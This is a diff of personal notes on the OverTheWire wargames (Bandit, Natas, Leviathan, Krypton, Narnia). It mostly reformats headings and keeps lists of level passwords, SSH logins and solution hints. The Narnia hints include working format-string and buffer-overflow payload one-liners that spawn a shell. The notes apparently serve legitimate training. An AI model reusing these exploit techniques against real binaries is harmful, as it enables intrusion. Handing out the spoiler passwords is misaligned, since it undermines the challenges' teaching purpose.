@@ -8,11 +8,11 @@
 	--> port: 2220  (SSH)
 	
 	rule : 
-	  -->Write-access to homedirectories is disabled
-	  -->/tmp/ : mktemp -d
-	  -->Read-access to both /tmp/ is disabled
-	  -->/proc restricted so that users cannot snoop on eachother
-	  -->installed : 
+	  --> Write-access to homedirectories is disabled
+	  --> /tmp/ : mktemp -d
+	  --> Read-access to both /tmp/ is disabled
+	  --> /proc restricted so that users cannot snoop on eachother
+	  --> installed : 
 	    	-->* gef (https://github.com/hugsy/gef) in /opt/gef/
 	    	-->* pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
 	    	-->* peda (https://github.com/longld/peda.git) in /opt/peda/
@@ -20,8 +20,7 @@
 	    	-->* pwntools (https://github.com/Gallopsled/pwntools)
 	    	-->* radare2 (http://www.radare.org/)
 		-->/etc/bandit_pass/bandit27
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	password: 
+### Password: 
 		-->0:bandit0
 		-->1:NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
 		-->2:rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
@@ -55,8 +54,7 @@
 		-->30:OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
 		-->31:rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
 		-->32:odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
-
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+### Hint
 		Level 0:  cat file 
 		Level 1:  cat ./-
 		Level 2:  cat "spaces in this filename"
@@ -96,8 +94,7 @@
 	--> /etc/natas_webpass/. (/etc/natas_webpass/natas29)
 	--> HINT :  https://github.com/javiunzu/natas
 	
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	password: 
+### Password: 
 		-->0:natas0
 		-->1:g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
 		-->2:h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
@@ -133,8 +130,7 @@
 		-->32:Yp5ffyfmEdjvTOwpN5HCvh7Ctgf9em3G
 		-->33:APwWDD3fRAf6226sgBOBaSptGwvXwQhG
 		-->34:F6Fcmavn8FgZgrAPOvoLudNr1GwQTaNG
-
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+### Hint
 		Level 0:  ctrl + u 
 		Level 3:  /robots.txt/
 		Level 5:  burp suite --Referer:
@@ -164,7 +160,7 @@
 	--> ssh leviathan6@leviathan.labs.overthewire.org -p 2223
 	--> summary : ltrace / ln -s / mktemp / cat / whoami / la -al 
 	
-	password: 	
+### Password: 	
 		-->1: PPIfmI1qsA
 		-->2: mEh5PNl10e
 		-->3: Q0G8j4sakn
@@ -172,7 +168,7 @@
 		-->5: EKKlTF1Xqs
 		-->6: YZ55XPVk2l
 		-->7: 8GpZ5f8Hze
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+### Hint
 		Level 1: cat bookmarks.html | grep password
 		Level 2: create a space file to evaded the check 
 		level 6: foe loop (.sh)
@@ -184,8 +180,7 @@
 	--> /krypton/krypton
 	
 	--> ssh krypton1@krypton.labs.overthewire.org -p 2231
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	password: 
+### Password: 
 		-->1: KRYPTONISGREAT
 		-->2: ROTTEN
 		-->3: CAESARISEASY
@@ -193,7 +188,7 @@
 		-->5: CLEARTEXT
 		-->6: RANDOM
 		-->7: LFSRISNOTRANDOM
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+### Hint
 	level 7 : 
 		temp = []
 		for x in "EICTDGYIYZKTHNSIRFXYCPFUEOCKRN":
@@ -230,8 +225,7 @@
 	--> Script : https://blog.csdn.net/kang0x0/article/details/121088689
 	--> Teach  : https://blog.csdn.net/m0_55144954/article/details/136445954
 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	password: 
+### Password: 
 		-->1: eaa6AjYMBB
 		-->2: Zzb6MIyceT
 		-->3: 8SyQ2wyEDU
@@ -241,7 +235,7 @@
 		-->7: YY4F9UaB60
 		-->8: 1aBcDgPttG
 		-->9: can't do 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+### Hint
 		level5 : ./narnia5 $(python3 -c 'import sys; sys.stdout.buffer.write(b"\xd0\xd5\xff\xff\xd0\xd5\xff\xff%492x%n")')
 		level6 : ./narnia6 $(python3 -c 'import sys; sys.stdout.buffer.write(b"AAAAAAAA" + b"\x70\x81\xc4\xf7")') "BBBBBBBB/bin/sh"
 		level7 : ./narnia7 $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x08\xd5\xff\xff" + b"%134517531d%2$n")') // decimal value 
@@ -266,7 +260,7 @@
 		-->7: 
 		-->8:
 		
-end game // is ok // no need learn too many pwn 
+
 
 ## Utumno : 
 	--> username : utumno0
